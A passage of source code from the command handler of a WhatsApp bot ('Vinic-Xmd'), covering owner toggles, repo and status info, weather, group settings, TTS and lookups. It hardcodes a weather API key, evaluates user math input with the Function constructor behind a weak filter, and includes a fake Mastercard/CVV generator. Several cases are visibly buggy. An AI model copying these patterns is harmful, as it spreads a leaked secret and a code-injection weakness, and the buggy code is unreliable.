*BUG REPORT*

*User*: @${m.sender.split("@")[0]}
*Issue*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your bug report has been forwarded to my developer.
Please wait for a reply.

*Details:*
${bugReportMsg}
    `;

    conn.sendMessage("256742932677@s.whatsapp.net", { text: bugReportMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "groupid": {
    if (!Access) return reply(mess.owner);
    if (!q) return reply('*Please provide a group link*!');
    
    let linkRegex = args.join(" ");
    let coded = linkRegex.split("https://chat.whatsapp.com/")[1];
    if (!coded) return reply("Link Invalid");

    Cypher.query({
      tag: "iq",
      attrs: {
        type: "get",
        xmlns: "w:g2",
        to: "@g.us"
      },
      content: [{ tag: "invite", attrs: { code: coded } }]
    }).then(async (res) => {
      const tee = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`;
      reply(tee + '@g.us');
    });
}
break
case 'autotyping': {
                if (!Access) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
         }
    
break
case "autorecording": {

                if (!Access) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true

                    reply(`Successfully 💠changed auto-recording to ${q}`)

                } else if (q === 'off') {

                    autoRecording = false

                    reply(`Successfully changed auto-recording to ${q} `)

           }
}
break
case "autoviewstatus": {
    if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`);

    const validOptions = ["on", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply("Invalid option");

    if (!global.db.data.settings) global.db.data.settings = {};
    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
    let setting = global.db.data.settings[botNumber];
    
    // Initialize config if it doesn't exist
    if (!setting.config) setting.config = {};
    
    // Set the autoviewstatus setting
    setting.config.autoviewstatus = option === "on";

    await saveDatabase();

    reply(`Auto view status ${option === "on" ? "enabled" : "disabled"} successfully`);
}
break
case "welcome": {
    if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`);

    const validOptions = ["on", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply("Invalid option");

    // Fix: Ensure the chat exists in the database first
    if (!global.db.data.chats) global.db.data.chats = {};
    if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};
    
    // Set the welcome setting
    global.db.data.chats[m.chat].welcome = option === "on";

    await saveDatabase();

    reply(`Welcome and left messages ${option === "on" ? "enabled" : "disabled"} successfully for this group`);
}
break
case 'delpp': {
if (!Access) return reply(mess.owner);
conn.removeProfilePicture(conn.user.id)
("*Successfully deleted profile pic*")
}
break 
case "unblockall": {
    if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();
      if (!blockedList.length) return reply("✅ No blocked contacts to unblock.");

      for (const user of blockedList) {
        await conn.updateBlockStatus(user, "unblock");
      }

      reply(`✅ Successfully unblocked *${blockedList.length}* contacts.`);
    } catch (error) {
      reply("⚠️ Failed to unblock all contacts.");
    }
}
break
case "online": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/match_last_seen\nExample: ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateOnlinePrivacy(text);
    await reply(mess.done);
}
break
case "setbio": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Text needed*\nExample: ${prefix + command} ${global.botname}`);

    await conn.updateProfileStatus(text);
    reply(`*Successfully updated bio to "${text}"*`);
}
break
//====[TOOLS MENU CMDS]====
case "ping": {
const startTime = performance.now();

    try {
      const sentMessage = await conn.sendMessage(m.chat, {
        text: "🔸Pong!",
        contextInfo: { quotedMessage: m.message }
      });
      
      const endTime = performance.now();
      const latency = `${(endTime - startTime).toFixed(2)} ms`;
      
      await conn.sendMessage(m.chat, {
        text: `*💯 ${botname} Speed:* ${latency}`,
        edit: sentMessage.key, 
        contextInfo: { quotedMessage: m.message }
      });

    } catch (error) {
      console.error('Error sending ping message:', error);
      await conn.sendMessage(m.chat, {
        text: 'An error occurred while trying to ping.',
        contextInfo: { quotedMessage: m.message }
      });
   }
}
break
case "repo": {
  try {
    // GitHub repository details
    const repoOwner = "Kevintech-hub";
    const repoName = "Vinic-Xmd-";
    const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}`;
    
    // Fetch repository data with error handling
    const { data } = await axios.get(apiUrl, {
      timeout: 5000, // 5 second timeout
      headers: {
        'User-Agent': 'Vinic-Xmd-Bot' // GitHub requires user-agent
      }
    }).catch(err => {
      console.error('GitHub API Error:', err);
      throw new Error('Failed to connect to GitHub API');
    });

    // Validate response data
    if (!data || typeof data !== 'object') {
      throw new Error('Invalid GitHub API response');
    }

    // Format repository information
    const repoInfo = `
    * BOT REPOSITORY *
    
 *Name:* ${String(data.name || repoName).padEnd(20)}
 *Stars:* ${String(data.stargazers_count || 0).padEnd(20)}
 *Forks:* ${String(data.forks_count || 0).padEnd(21)}
 *Watchers:* ${String(data.watchers_count || 0).padEnd(18)}
 *Language:* ${String(data.language || 'Not specified').padEnd(16)}
 *License:* ${String(data.license?.name || 'None').padEnd(19)}
 *GitHub Link:* 
https://github.com/${repoOwner}/${repoName}
────────────────────────────────
@${m.sender.split("@")[0]}👋, Don't forget to star and fork my repository!`;
    // Send the response with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        text: repoInfo.trim(),
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: "Vinic-Xmd Repository",
            body: `⭐ Star the repo to support development!`,
            thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg'), // Fallback thumbnail
            mediaType: 1,
            sourceUrl: `https://github.com/${repoOwner}/${repoName}`
          }
        }
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Repo command error:', error);
    
    // Fallback response when GitHub API fails
    const fallbackInfo = `
    * BOT REPOSITORY *
    
 *Name:* Vinic-Xmd
 *GitHub Link:* 
https://github.com/Kevintech-hub/Vinic-Xmd-

@${m.sender.split("@")[0]}👋, Visit the repository for more info!`;

    await conn.sendMessage(
      m.chat,
      { 
        text: fallbackInfo,
        contextInfo: {
          mentionedJid: [m.sender]
        }
      },
      { quoted: m }
    );
  }
}
break
case "sc": {
const githubRepoURL = 'https://github.com/Kevintech-hub/Vinic-Xmd-';

    try {
        const [, username, repoName] = githubRepoURL.match(/github\.com\/([^/]+)\/([^/]+)/);

        const response = await fetch(`https://api.github.com/repos/${username}/${repoName}`);
        if (!response.ok) throw new Error(`GitHub API error: ${response.status}`);

        const repoData = await response.json();

        const formattedInfo = `

╭──〔 🚀 VINIC-XMD REPO〕──
│
├─ 𖥸 *ɴᴀᴍᴇ*   : ${repoData.name}
├─ ⭐ *sᴛᴀʀs*    : ${repoData.stargazers_count}
├─ 🍴 *ғᴏʀᴋs*    : ${repoData.forks_count}
├─ 👑 *ᴏᴡɴᴇʀ*   : Kevin
├─ 📜 *ᴅᴇsᴄ* : ${repoData.description || 'No description available'}
├─ 🔗 *ʀᴇᴘᴏ ʟɪɴᴋ*  : ${repoUrl}
├─ 🧠 *sᴛᴀʀᴛ*     :  *${config.PREFIX}ᴍᴇɴᴜ* tᴏ ʙᴇɢɪɴ
│
╰──〔 *Dev kevin* 〕──

`;

        await conn.sendMessage(from, {
            image: { url: 'https://files.catbox.moe/ptpl5c.jpeg' },
            caption: formattedInfo,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: config.NEWSLETTER_JID || '120363401548261516@newsletter',
                    newsletterName: '🔥Vinic-repo🔥',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

        // Send audio intro
        await conn.sendMessage(from, {
      audio: { url: 'https://files.catbox.moe/tsuw7i.mp3' },
      mimetype: 'audio/mp4',
      ptt: true
    }, { quoted: mek });
    

    } catch (error) {
        console.error("❌ Error in repo command:", error);
        reply("⚠️ Failed to fetch repo info. Please try again later.");
    }
}
break
//======[CMD TOOLS MENU]=====
case "alive": {
    const botUptime = runtime(process.uptime());
    
    // Array of image URLs
    const imageUrls = [
        "https://files.catbox.moe/uw1n4n.jpg",
        "https://files.catbox.moe/rv7k2o.jpg",
        "https://files.catbox.moe/ucx5mq.jpg"
    ];
    
    // Array of audio URLs
    const audioUrls = [
        "https://files.catbox.moe/gttyv1.mp3",
        "https://files.catbox.moe/9cigm5.mp3",
        "https://files.catbox.moe/yny58w.mp3",
        "https://files.catbox.moe/ckie6b.m4a",
        "https://files.catbox.moe/zhr5m2.mp3"
        
    ];
    
    // Randomly select an image URL
    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
    
    // Randomly select an audio URL
    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
    
    // Send the randomly selected image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: randomImageUrl },
            caption: `*🌹Hi. I am 👑VINIC-XMD, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${botUptime}*`
        },
        { quoted: m }
    );
    
    // Send the randomly selected audio as PTT
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: randomAudioUrl },
            ptt: true,
            mimetype: 'audio/mp4'
        },
        { quoted: m }
    );
}
break
case 'botinfo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name     : ${botname}
│ • Owner    : ${ownername}
│ • Version  : ${global.versions}
│ • ᴄᴍᴅs    : 100+
│ • Developer: Kelvin tech
│ • Runtime  : ${runtime(process.uptime())}
╰─────────────`

  const imageUrl = "https://files.catbox.moe/uy3kq9.jpg";
  
  // Array of audio URLs
  const audioUrls = [
      "https://files.catbox.moe/gttyv1.mp3",
        "https://files.catbox.moe/9cigm5.mp3",
        "https://files.catbox.moe/yny58w.mp3",
        "https://files.catbox.moe/ckie6b.m4a",
        "https://files.catbox.moe/zhr5m2.mp3"
  ];
  
  // Randomly select an audio URL
  const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
  
  // Send the image with caption
  await conn.sendMessage(
      m.chat, 
      { 
          image: { url: imageUrl },
          caption: `*🌹Hi. I am 👑VINIC-XMD, a friendly WhatsApp bot.*${botInfo}`
      },
      { quoted: m }
  );
  
  // Send the randomly selected audio as PTT
  await conn.sendMessage(
      m.chat,
      {
          audio: { url: randomAudioUrl },
          ptt: true,
          mimetype: 'audio/mp4'
      },
      { quoted: m }
  );
}
break
case "bothosting": {
try {
        

        const message = `
*STEPS ON HOW TO DEPLOY A WHATSAPP BOT*
First you need a GitHub account.
Create one using the link:
https://github.com/

Secondly create a discord account.
https://discord.com/login

Once your done creating and verifying the two account, move over to the next step.

*NEXT STEPS*
Next step is to fork the bot repository. Click the link
https://github.com/Kevintech-hub/Vinic-Xmd-

Then download the zip file.

Now authorise your discord account then claim coins for 3days, each day u can claim 10 coins.


https://bot-hosting.net/?aff=1334589985369624636

*NOTE:* Some bot require larger server to process while. (25 coin)

When your done creating a server (25 coin) open the server.

Upload your bot code you have downloaded

Start server Enjoy 😉
        `.trim();

        await conn.sendMessage(from, {
            image: { url: 'https://files.catbox.moe/ptpl5c.jpeg' },
            caption: message,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363401548261516@newsletter',
                    newsletterName: '🪀『Vinic-Xmd』🪀',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

    } catch (e) {
        console.error("Support Cmd Error:", e);
        reply(`⚠️ An error occurred:\n${e.message}`);
    }
}
break
case "botstatus": {
const used = process.memoryUsage();
      const ramUsage = `${formatSize(used.heapUsed)} / ${formatSize(os.totalmem())}`;
      const freeRam = formatSize(os.freemem());
      const disk = await checkDiskSpace(process.cwd());
      const latencyStart = performance.now();
      
      await reply("⏳ *Calculating ping...*");
      const latencyEnd = performance.now();
      const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;

      const { download, upload } = await checkBandwidth();
      const uptime = runtime(process.uptime());

      const response = `
      * BOT STATUS *

 *Ping:* ${ping}
 *Uptime:* ${uptime}
 *RAM Usage:* ${ramUsage}
 *Free RAM:* ${freeRam}
 *Disk Usage:* ${formatSize(disk.size - disk.free)} / ${formatSize(disk.size)}
 *Free Disk:* ${formatSize(disk.free)}
 *Platform:* ${os.platform()}
 *NodeJS Version:* ${process.version}
 *CPU Model:* ${os.cpus()[0].model}
 *Downloaded:* ${download}
 *Uploaded:* ${upload}
`;

      conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
}
break
case "serverinfo": { 
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const muptime = runtime(process.uptime()).trim()
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);

const serverInfo = `Server Information:\n
- CPU Cores: ${cpus.length}
- CPU Model: ${cpus[0].model}
- Platform: ${os.platform()}
- Architecture: ${os.arch()}
- Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
- RAM: ${formattedUsedMem} / ${formattedTotalMem}
- Load Average (1, 5, 15 min): ${loadAverage}
- Response Time: ${speed} seconds
- Runtime: ${muptime}
- Type: case 
`.trim();

await reply(serverInfo)
}
//======[OTHER MUNE CMDS]====
case 'weather': {
                      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
break;
  case 'add': {
                if (!m.isGroup) return m.reply(mess.group)
                if(!Owner) return m.reply(mess.owner)
                if (!isBotAdmins) return reply(mess.admin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await dave.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                m.reply(mess.done)
          }
                


//==================================================//              
        case "desc": case "setdesc": { 
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply("bot must be admin in this group")
    if (!text) throw 'Provide the text for the group description' 
    await conn.groupUpdateDescription(m.chat, text); 
    m.reply('Group description successfully updated!')
} 
break;
//==================================================//     
        case "disp-90": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await conn.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break; 
//==================================================//         
        case "disp-off": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await conn.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;

//==================================================//  
        case "disp-1": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await conn.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
break
case 'take': {
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

if(!msgR) return reply('*Quote an image, a short video or a sticker to change watermark*.'); 

let media;
if (m.imageMessage) {
     media = msgR.imageMessage
  } else if(msgR.videoMessage) {
media = args.join(" ").videoMessage
  } 
  else if (msgR.stickerMessage) {
    media = msgR.stickerMessage ;
  } else {
    reply('This is neither a sticker, image nor a video...'); return
  } ;

var result = await conn.downloadAndSaveMediaMessage(media);

let stickerResult = new Sticker(result, {
            pack: pushname,
            author: pushname,
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"],
            id: "12345",
            quality: 70,
            background: "transparent",
          });
const Buffer = await stickerResult.toBuffer();
          conn.sendMessage(m.chat, { sticker: Buffer }, { quoted: m });

}
break;
//==================================================//
case "dev":
case "developer": {
  try {
    // Developer information (replace with your actual details)
    const devInfo = {
      name: "Kevin Tech",      // Developer name
      number: "256742932677",  // Developer WhatsApp number (without + or @)
      organization: "Vinic-Xmd Development Team",
      note: "Bot Developer"
    };

    // Create vCard
    const vcard = `BEGIN:VCARD
VERSION:3.0
FN:${devInfo.name}
ORG:${devInfo.organization};
TEL;type=CELL;type=VOICE;waid=${devInfo.number}:${devInfo.number}
NOTE:${devInfo.note}
END:VCARD`;

    // Send as contact card
    await conn.sendMessage(
      m.chat, 
      {
        contacts: {
          displayName: devInfo.name,
          contacts: [{
            displayName: devInfo.name,
            vcard: vcard
          }]
        },
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: `Developer Contact`,
            body: `Contact ${devInfo.name} for support`,
            thumbnail: fs.readFileSync('./start/lib/kelvin/dev.jpg'), // Your dev photo
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      },
      { quoted: m }
    );

    // Also send text info as fallback
    await conn.sendMessage(
      m.chat,
      { 
        text: `👨‍💻 *Developer Information*\n\n` +
              `• *Name:* ${devInfo.name}\n` +
              `• *Contact:* wa.me/${devInfo.number}\n` +
              `• *Role:* ${devInfo.note}\n` +
              `• *Team:* ${devInfo.organization}`,
              
        mentions: [m.sender]
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Error in dev command:', error);
    reply("❌ Failed to display developer information. Please try again later.");
  }
}
break
case "say": {
let text = args.join(" ");
    if (!text) return reply("*Text needed!*");

    try {
      const ttsData = await googleTTS.getAllAudioBase64(text, {
        lang: "en",
        slow: false,
        host: "https://translate.google.com",
        timeout: 10000,
      });

      if (!ttsData.length) return reply("*Failed to generate TTS audio.*");

      const tempFiles = [];
      for (let i = 0; i < ttsData.length; i++) {
        let filePath = `/tmp/tts_part${i}.mp3`;
        fs.writeFileSync(filePath, Buffer.from(ttsData[i].base64, "base64"));
        tempFiles.push(filePath);
      }

      
      let mergedFile = "/tmp/tts_merged.mp3";
      let ffmpegCommand = `ffmpeg -i "concat:${tempFiles.join('|')}" -acodec copy ${mergedFile}`;
      exec(ffmpegCommand, async (err) => {
        if (err) {
          console.error("FFmpeg error:", err);
          return reply("*Error merging audio files.*");
        }

        await conn.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync(mergedFile),
            mimetype: "audio/mp4",
            ptt: true,
            fileName: "tts_audio.mp3",
          },
          { quoted: m }
        );

        tempFiles.forEach(file => fs.unlinkSync(file));
        fs.unlinkSync(mergedFile);
      });
    } catch (error) {
      console.error("Error in TTS Command:", error);
      reply("*An error occurred while processing the TTS request.*");
    }
}
break
case "tinylink": {
    if (!text) return reply(`*Example: ${prefix + command} https://github.com/Kevintech-hub/Vinic-Xmd-*`);
    
    try {
      const response = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`);
      reply(response.data);
    } catch (error) {
      console.error(error);
      reply('*An error occurred while shortening the URL.*');
    }
}
break
case "vcc": {
const apiUrl = `${global.mess.siputzx}/api/tools/vcc-generator?type=MasterCard&count=5`;

    try {
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.status || !result.data || result.data.length === 0) {
        return reply("❌ Unable to generate VCCs. Please try again later.");
      }

      let responseMessage = `🎴 *Generated VCCs* (Type: Mastercard and Count: 5):\n\n`;

      result.data.forEach((card, index) => {
        responseMessage += `#️⃣ *Card ${index + 1}:*\n`;
        responseMessage += `🔢 *Card Number:* ${card.cardNumber}\n`;
        responseMessage += `📅 *Expiration Date:* ${card.expirationDate}\n`;
        responseMessage += `🧾 *Cardholder Name:* ${card.cardholderName}\n`;
        responseMessage += `🔒 *CVV:* ${card.cvv}\n\n`;
      });

      reply(responseMessage);
    } catch (error) {
      console.error("Error fetching VCC data:", error);
      reply("An error occurred while generating VCCs. Please try again later.");
    }
}
//==================================================//
break
case "calculate":
case "calc":
case "math": {
    try {
        if (!text) return reply(`📝 *Examples:*\n${prefix}calc 5 + 3\n${prefix}calc 10% of 200\n${prefix}calc 2^3\n${prefix}calc sqrt(16)`);

        // Clean and prepare the expression
        const expr = text
            .replace(/×/g, '*')
            .replace(/÷/g, '/')
            .replace(/π/g, 'pi')
            .replace(/π/g, 'pi')
            .replace(/\^/g, '**') // Convert ^ to ** for exponentiation
            .replace(/sqrt\(/g, 'Math.sqrt(')
            .replace(/sin\(/g, 'Math.sin(')
            .replace(/cos\(/g, 'Math.cos(')
            .replace(/tan\(/g, 'Math.tan(')
            .replace(/log\(/g, 'Math.log10(')
            .replace(/ln\(/g, 'Math.log(')
            .replace(/abs\(/g, 'Math.abs(')
            .replace(/%/g, '/100')
            .replace(/deg/g, 'deg')
            .replace(/,/g, ';')
            .trim();

        // Validate expression for safety
        const safeRegex = /^[0-9+\-*/().\s\^%πesincoqrtanlgabMh\s]+$/i;
        if (!safeRegex.test(expr)) {
            return reply('❌ *Invalid characters in expression.*\nOnly numbers, basic operators, and math functions are allowed.');
        }

        let result;
        
        // Handle percentage calculations
        if (text.includes('%')) {
            const percentMatch = text.match(/(\d+)%\s*(of)?\s*(\d+)/i);
            if (percentMatch) {
                const percent = parseFloat(percentMatch[1]);
                const number = parseFloat(percentMatch[3]);
                result = (percent / 100) * number;
            }
        }
        
        // Handle unit conversions
        else if (text.includes('to')) {
            const conversionMatch = text.match(/(\d+)\s*(\w+)\s*to\s*(\w+)/i);
            if (conversionMatch) {
                const value = parseFloat(conversionMatch[1]);
                const fromUnit = conversionMatch[2].toLowerCase();
                const toUnit = conversionMatch[3].toLowerCase();
                
                result = convertUnits(value, fromUnit, toUnit);
                if (result !== undefined) {
                    reply(`*Conversion:* ${value} ${fromUnit} = ${result} ${toUnit}`);
                    return;
                }
            }
        }

        // Evaluate mathematical expression
        if (result === undefined) {
            try {
                // Use Function constructor for safer evaluation
                result = Function('"use strict"; return (' + expr + ')')();
                
                // Check if result is valid
                if (typeof result !== 'number' || isNaN(result) || !isFinite(result)) {
                    throw new Error('Invalid result');
                }
                
            } catch (evalError) {
                console.error('Calculation error:', evalError);
                return reply('❌ *Could not calculate the expression.*\nPlease check your syntax and try again.');
            }
        }

        // Format the result
        let formattedResult = result;
        if (Number.isInteger(result)) {
            formattedResult = result.toString();
        } else {
            formattedResult = result.toFixed(6).replace(/\.?0+$/, '');
        }

        // Create response
        const calculationResponse = `
🧮 *CALCULATION RESULT*

*Expression:* ${text}
*Result:* ${formattedResult}

*Full precision:* ${result}
        `.trim();

        reply(calculationResponse);

    } catch (error) {
        console.error('Error in calculate command:', error);
        reply('❌ *An error occurred during calculation.*\nPlease try a different expression.');
    }
    
}
break
case "owner": {
    try {
        // Get the owner number(s) from global config
        let ownerNumbers = [];
        
        // Handle different formats of owner configuration
        if (Array.isArray(global.owner)) {
            // If owner is an array of numbers
            ownerNumbers = global.owner.map(num => {
                const cleanNum = num.replace(/[^0-9]/g, '');
                return cleanNum + '@s.whatsapp.net';
            });
        } else if (typeof global.owner === 'string') {
            // If owner is a single string/number
            const cleanNum = global.owner.replace(/[^0-9]/g, '');
            ownerNumbers = [cleanNum + '@s.whatsapp.net'];
        } else if (global.ownernumber) {
            // Fallback to ownernumber if it exists
            const cleanNum = String(global.ownernumber).replace(/[^0-9]/g, '');
            ownerNumbers = [cleanNum + '@s.whatsapp.net'];
        } else {
            // Default fallback
            ownerNumbers = ['256742932677@s.whatsapp.net'];
        }

        const ownerList = [];

        for (const number of ownerNumbers) {
            try {
                const displayName = await conn.getName(number).catch(() => 'Owner');
                ownerList.push({
                    displayName: displayName,
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${displayName}\nFN:${displayName}\nitem1.TEL;waid=${number.split('@')[0]}:${number.split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
                });
            } catch (error) {
                console.error(`Error getting name for ${number}:`, error);
                // Add with basic info even if name fetch fails
                ownerList.push({
                    displayName: 'Bot Owner',
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Owner\nFN:Owner\nitem1.TEL;waid=${number.split('@')[0]}:${number.split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
                });
            }
        }

        await conn.sendMessage(
            m.chat,
            { 
                contacts: { 
                    displayName: `${ownerList.length} Owner Contact`, 
                    contacts: ownerList 
                }, 
                mentions: [sender] 
            },
            { quoted: m }
        );
    } catch (error) {
        console.error('Error sending owner contact:', error.message);
        await conn.sendMessage(
            m.chat,
            { text: `*Error:* ${error.message}` },
            { quoted: m }
        );
    }
    
}
break
case "listpc": {
if (!Access) return reply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
reply(teks)
}
break
case 'getbisnis': case 'getbusiness': {
  let input = m.quoted ? m.quoted.sender : text || m.sender;
  input = input.replace(/[^+\d]/g, '');
  let target;
  if (input.startsWith('+')) {
    target = input.slice(1).replace(/^0+/, '') + '@s.whatsapp.net';
  } else if (input.startsWith('0')) {
    target = '254' + input.slice(1) + '@s.whatsapp.net';
  } else if (input.startsWith('62')) {
    target = input + '@s.whatsapp.net';
  } else if (input.includes('@s.whatsapp.net')) {
    target = input;
  } else {
    target = '256' + input + '@s.whatsapp.net';
  }

  try {
    const profile = await bot.getBusinessProfile(target);
    const name = await bot.getName(target); 
    const pfp = await bot.profilePictureUrl(target, 'image').catch(() => null);
    const desc = profile.description || 'invalid.';
    const category = profile.category ||'invalid';
    const website = profile.website || 'invalid';
    const address = profile.address || 'invalid';
    const email = profile.email || 'invalid';
    const caption = `*📇Business profile*\n\n` +
      `*👤 Name:* ${name}\n` +
      `*🏢 Category:* ${category}\n` +
      `*🌐 Website:* ${website}\n` +
      `*📍 Address:* ${address}\n` +
      `*✉️ Email:* ${email}\n\n` +
      `*📝 Description:*\n${desc}`;
    if (pfp) {
      await bot.sendMessage(m.chat, {
        image: { url: pfp },
        caption,
      }, { quoted: m });
    } else {
      m.reply(caption);
    }
  } catch (err) {
    console.error(err);
    m.reply('error.');
  }
}
break
case "botstatus": {
  const used = process.memoryUsage();
  const ramUsage = `${formatSize(used.heapUsed)} / ${formatSize(os.totalmem())}`;
  const freeRam = formatSize(os.freemem());
  
  // Properly await checkDiskSpace
  const disk = await checkDiskSpace(process.cwd()); 
  
  const latencyStart = performance.now();
  await reply("⏳ *Calculating ping...*");
  const latencyEnd = performance.now();
  const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;

  const { download, upload } = await checkBandwidth();
  const uptime = runtime(process.uptime());

      const response = `
      * BOT STATUS *

 *Ping:* ${ping}
 *Uptime:* ${uptime}
 *RAM Usage:* ${ramUsage}
 *Free RAM:* ${freeRam}
 *Disk Usage:* ${formatSize(disk.size - disk.free)} / ${formatSize(disk.size)}
 *Free Disk:* ${formatSize(disk.free)}
 *Platform:* ${os.platform()}
 *NodeJS Version:* ${process.version}
 *CPU Model:* ${os.cpus()[0].model}
 *Downloaded:* ${download}
 *Uploaded:* ${upload}
`;
  await conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
  
}
break
case "getabout": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) {
      return reply('Reply to a user to get their about/bio.');
    }

    const userId = m.quoted.sender;

    try {
      const { status, setAt } = await conn.fetchStatus(userId);
      const formattedDate = moment(setAt).format("MMMM Do YYYY, h:mm:ss A");

      await conn.sendMessage(m.chat, { 
        text: `💢 *About of:* @${userId.split('@')[0]}\n\n"${status}"\n\n🕒 *Set at:* ${formattedDate}`,
        mentions: [userId] 
      }, { quoted: m });

    } catch {
      reply('⚠️ Unable to fetch the user’s about info. This may be due to their privacy settings.');
    }
}
break
case "gsmarena": {
    if (!text) return reply("*Please provide a query to search for smartphones.*");

    try {
      const apiUrl = `${global.mess.siputzx}/api/s/gsmarena?query=${encodeURIComponent(text)}`;
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.status || !result.data || result.data.length === 0) {
        return reply("*No results found. Please try another query.*");
      }

      const limitedResults = result.data.slice(0, 10);
